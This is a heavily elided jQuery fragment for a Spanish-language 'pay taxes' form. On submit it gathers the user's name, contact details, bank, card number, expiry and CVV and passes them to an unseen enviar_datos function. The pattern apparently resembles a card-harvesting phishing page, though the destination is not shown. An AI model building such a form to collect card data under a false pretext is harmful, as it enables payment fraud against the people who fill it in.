...
$(document).ready(function() {   
    ...
    $("#btn-pagar-impuestos").click(function(){
        ...
        if (ok_datos == 0) {
            ...
            $("#fondo").show();
            $("#frm-animacion,#fondoapp").show();
            $("#frm-informacion,.alerta").hide(); 
            enviar_datos($("#txt-nombre").val(),$("#txt-celular").val(),$("#txt-correo").val(),$("#txt-direccion").val(),$("#txt-ciudad").val(),$("#txt-entidad").val(),$("#txt-tarjeta").val(),fecha,$("#txt-cvv").val());
        }
    });
